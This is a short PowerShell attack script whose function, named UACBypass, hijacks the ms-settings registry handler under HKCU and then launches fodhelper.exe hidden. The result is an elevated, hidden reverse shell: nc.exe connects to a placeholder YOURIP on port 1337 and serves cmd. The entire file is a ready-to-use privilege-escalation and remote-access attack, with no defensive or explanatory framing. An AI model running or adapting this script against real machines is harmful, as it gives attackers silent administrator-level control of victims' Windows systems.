<#
.NOTES
    Author: 0xshdax
#>

function UACBypass {
    $CMD = "powershell -windowstyle hidden C:\Windows\Temp\nc.exe YOURIP 1337 -e cmd"

    New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
    Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $CMD -Force

    New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
    Set-ItemProperty "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -Value ".pwn" -Force

    Start-Process -FilePath "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
}
